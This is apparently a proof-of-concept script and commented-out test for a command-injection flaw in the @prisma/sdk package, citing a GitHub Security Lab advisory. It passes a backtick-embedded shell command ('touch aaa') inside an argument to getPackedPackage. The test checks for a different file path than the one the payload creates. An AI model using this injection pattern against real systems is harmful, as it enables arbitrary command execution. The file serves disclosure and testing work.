//https://securitylab.github.com/advisories/GHSL-2021-060-prisma-sdk-cmd-injection/
const sdk = require("@prisma/sdk");
sdk.getPackedPackage("foo", "bar", "foo`touch aaa`").then(() => {
  console.log("done");
});

// test("Command Injection in @prisma/sdk", () =>
// {
//     const sdk = require("@prisma/sdk");
// 	const fs = require('fs');
// 	const path = './prisma';
// 	const sleep = require('sleep');

// 	//checking that its not present already
// 	file_exist = fs.existsSync(path);
// 	expect(file_exist).toBe(false);

//     sdk.getPackedPackage("foo", "bar", "foo`touch aaa`");

// 	sleep.sleep(5);
// 	//checking that its created by after exploit.
// 	file_exist = fs.existsSync(path);
// 	expect(file_exist).toBe(true);

// 	fs.unlink(path, function(err) {});//deleting the file after creation
// });
